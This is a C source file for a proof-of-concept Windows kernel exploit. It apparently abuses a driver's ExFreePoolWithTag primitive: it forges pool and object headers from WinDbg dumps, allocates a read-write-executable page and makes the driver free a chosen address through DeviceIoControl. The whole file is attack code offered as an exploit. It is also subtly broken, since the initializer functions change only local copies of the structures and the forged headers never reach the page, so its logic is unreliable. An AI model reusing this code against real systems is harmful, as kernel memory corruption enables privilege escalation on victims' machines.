#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	char* memory_page = (void*)0;
	POOL_HEADER pool_header;
	OBJECT_HEADER_QUOTA object_header_quota;
	OBJECT_HEADER object_header;
	char output[256];
	unsigned long bytes_returned = 0L, old_protection = 0L;

	RtlSecureZeroMemory(&pool_header, sizeof(pool_header));
	RtlSecureZeroMemory(&object_header_quota, sizeof(object_header_quota));
	RtlSecureZeroMemory(&object_header, sizeof(object_header));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("%s\n[!] ExFreePoolWithTag Proof-of-Concept Exploit\n[!] Lets Exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the ExFreePool primitive driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the ExFreePool primitive driver. Handle Value: 0x%p", h_driver);

	memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
	if (!memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the process heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the process heap. Allocation Address: 0x%p", memory_page);

	if (!VirtualProtect(memory_page, 4096, PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the allocation as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the allocation as read+write+executable.");

	initialize_pool_header(&pool_header);
	printf("\n[+] Initialized fake pool header.");

	initialize_object_header_quota(&object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_object_header(&object_header);
	printf("\n[+] Initialized fake object header.");

	DeviceIoControl(h_driver, TARGET_IOCTL, &memory_page, sizeof(long long), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Free'd target pool address.\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}

void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffaa0b73f0dae0

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0;						// +0x000 PoolIndex        : 0y00000000 (0)
	pool_header.BlockSize = 0x17;					// +0x002 BlockSize        : 0y00010111 (0x17)
	pool_header.PoolType = 0x2;						// +0x002 PoolType         : 0y00000010 (0x2)
	pool_header.Ulong1 = 0x2170000;					// +0x000 Ulong1           : 0x2170000
	pool_header.PoolTag = 0x70707746;				// +0x004 PoolTag          : 0x70707746
	pool_header.AllocatorBackTraceIndex = 0x6B5E;	// +0x008 AllocatorBackTraceIndex : 0x6b5e
	pool_header.PoolTagHash = 0x9417;				// +0x00a PoolTagHash      : 0x9417
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA input_object_header_quota)
{
	OBJECT_HEADER_QUOTA object_header_quota = *input_object_header_quota;  // dt nt!_OBJECT_HEADER_QUOTA_INFO ffffaa0b73f0dae0+8

	object_header_quota.PagedPoolCharge = 0x94176B5E;					   // +0x000 PagedPoolCharge  : 0x94176b5e
	object_header_quota.NonPagedPoolCharge = 0xDE0E839E;				   // +0x004 NonPagedPoolCharge : 0xde0e839e
	object_header_quota.SecurityDescriptorCharge = 0x73F132A0;			   // +0x008 SecurityDescriptorCharge : 0x73f132a0
	object_header_quota.Reserved1 = 0xFFFFAA0B;							   // +0x00c Reserved1        : 0xffffaa0b
	object_header_quota.SecurityDescriptorQuotaBlock = 0xFFFF8407C9848D78; // +0x010 SecurityDescriptorQuotaBlock : 0xffff8407`c9848d78 Void
	object_header_quota.Reserved2 = 0;									   // +0x018 Reserved2        : 0
}

void initialize_object_header(POBJECT_HEADER input_object_header)
{
	OBJECT_HEADER object_header = *input_object_header;						// dt nt!_OBJECT_HEADER ffffaa0b73f0dae0+8+10

	object_header.PointerCount = 0x136305996165768;							// +0x000 PointerCount     : 0n-136305996165768
	object_header.HandleCount = 0;											// +0x008 HandleCount      : 0n0
	object_header.NextToFree = (void*)0;									// +0x008 NextToFree       : (null) 
	object_header.Lock = (void*)0;											// +0x010 Lock             : _EX_PUSH_LOCK
	object_header.TypeIndex = 0;											// +0x018 TypeIndex        : 0 '';
	object_header.TraceFlags = 0;											// +0x019 TraceFlags       : 0 ''
	object_header.DbgRefTrace = 0;											// +0x019 DbgRefTrace      : 0y0
	object_header.DbgTracePermanent = 0;									// +0x019 DbgTracePermanent : 0y0
	object_header.InfoMask = 0;												// +0x01a InfoMask         : 0 ''
	object_header.Flags = 0;												// +0x01b Flags            : 0 ''
	object_header.NewObject = 0;											// +0x01b NewObject        : 0y0
	object_header.KernelObject = 0;											// +0x01b KernelObject     : 0y0
	object_header.KernelOnlyAccess = 0;										// +0x01b KernelOnlyAccess : 0y0
	object_header.ExclusiveObject = 0;										// +0x01b ExclusiveObject  : 0y0
	object_header.PermanentObject = 0;										// +0x01b PermanentObject  : 0y0
	object_header.DefaultSecurityQuota = 0;									// +0x01b DefaultSecurityQuota : 0y0
	object_header.SingleHandleEntry = 0;									// +0x01b SingleHandleEntry : 0y0
	object_header.DeletedInline = 0;										// +0x01b DeletedInline    : 0y0
	object_header.Reserved = 0;												// +0x01c Reserved         : 0
	object_header.ObjectCreateInfo = 0x0100000000000130;					// +0x020 ObjectCreateInfo : 0x01000000`00000130 _OBJECT_CREATE_INFORMATION
	object_header.QuotaBlockCharged = 0x0100000000000130;					// +0x020 QuotaBlockCharged : 0x01000000`00000130 Void
	object_header.SecurityDescriptor = 0x0001001000000130;					// +0x028 SecurityDescriptor : 0x00010010`00000130 Void
	object_header.Body = (void*)0;											// +0x030 Body             : _QUAD
}